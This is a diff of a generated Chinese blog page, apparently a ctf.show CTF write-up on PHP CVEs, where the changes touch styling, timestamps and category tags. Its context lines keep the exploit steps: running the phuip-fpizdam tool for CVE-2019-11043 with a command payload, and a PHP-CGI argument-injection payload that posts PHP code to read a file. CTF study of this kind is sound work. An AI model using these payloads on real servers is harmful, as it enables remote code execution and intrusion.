@@ -29,7 +29,15 @@
     
     
       
-      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/atom-one-dark-reasonable.min.css" />
+      
+        
+          
+          
+          
+        
+        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
+      
+      
     
   
 
@@ -240,7 +248,7 @@
             
               <p class="note note-info">
                 
-                  本文最后更新于：3 个月前
+                  本文最后更新于：20 分钟前
                 
               </p>
             
@@ -249,15 +257,15 @@
 <p>抓包发现</p>
 <p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202201101645192.png" srcset="/img/loading.gif"><br>搜一下<br><a target="_blank" rel="noopener" href="https://blog.qualys.com/product-tech/2019/10/30/php-remote-code-execution-vulnerability-cve-2019-11043">PHP Remote Code Execution Vulnerability (CVE-2019-11043)</a></p>
 <p>具体利用：<br>工具：<a target="_blank" rel="noopener" href="https://github.com/neex/phuip-fpizdam">https://github.com/neex/phuip-fpizdam</a><br><a target="_blank" rel="noopener" href="https://www.topgoer.com/%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/go%E7%9A%84%E5%AE%89%E8%A3%85.html">需要安装go环境</a></p>
-<div class="hljs"><pre><code>git clone https://github.com/neex/phuip-fpizdam.git
+<pre><code>git clone https://github.com/neex/phuip-fpizdam.git
 cd phuip-fpizdam
-go get -v &amp;&amp; go build</code></pre></div>
+go get -v &amp;&amp; go build</code></pre>
 <p><code>go get</code>可能会<code>time out</code><br>执行如下命令：</p>
-<div class="hljs"><pre><code>go env -w GO111MODULE=on
+<pre><code>go env -w GO111MODULE=on
 go env -w GOPROXY=https://goproxy.io,direct
 
 # 设置不走 proxy 的私有仓库，多个用逗号相隔（可选）
-go env -w GOPRIVATE=*.gitlab.com</code></pre></div>
+go env -w GOPRIVATE=*.gitlab.com</code></pre>
 <p>然后<br><code>go run . &quot;http://5882cf97-4bf8-46e9-a282-e212fc598c19.challenge.ctf.show/index.php&quot;</code><br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202201101650720.png" srcset="/img/loading.gif"></p>
 <p>payload:<code>?a=cat fl*</code><br>多刷新几次就出来了</p>
 <h2 id="CVE-2018-19518"><a href="#CVE-2018-19518" class="headerlink" title="CVE-2018-19518"></a>CVE-2018-19518</h2><p>PHP imap 远程命令执行漏洞（CVE-2018-19518）</p>
@@ -278,8 +286,8 @@ go env -w GOPRIVATE=*.gitlab.com</code></pre></div>
 </ul>
 <p>经过使用-d指定auto_prepend_file来制造任意文件包含漏洞，执行任意代码</p>
 <p>payload：</p>
-<div class="hljs"><pre><code>index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input
-post：&lt;?php echo `cat /somewhere/fla9.txt`; ?&gt;</code></pre></div>
+<pre><code>index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input
+post：&lt;?php echo `cat /somewhere/fla9.txt`; ?&gt;</code></pre>
 <hr>
 <p>还有一个写session文件的和一个xdebug的，没有复现成功<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/q20010619/article/details/120594729">MORE</a></p>
 
@@ -291,13 +299,7 @@ post：&lt;?php echo `cat /somewhere/fla9.txt`; ?&gt;</code></pre></div>
                   <div class="post-meta mr-3">
                     <i class="iconfont icon-category"></i>
                     
-                      <a class="hover-with-bg" href="/categories/CTF/">CTF</a>
-                    
-                      <a class="hover-with-bg" href="/categories/CTF/wp/">wp</a>
-                    
-                      <a class="hover-with-bg" href="/categories/CTF/wp/ctfshow/">ctfshow</a>
-                    
-                      <a class="hover-with-bg" href="/categories/CTF/wp/ctfshow/phpcve/">phpcve</a>
+                      <a class="hover-with-bg" href="/categories/CVE/">CVE</a>
                     
                   </div>
                 
@@ -443,6 +445,8 @@ post：&lt;?php echo `cat /somewhere/fla9.txt`; ?&gt;</code></pre></div>
 
 
 
+  
+    
   
 
 
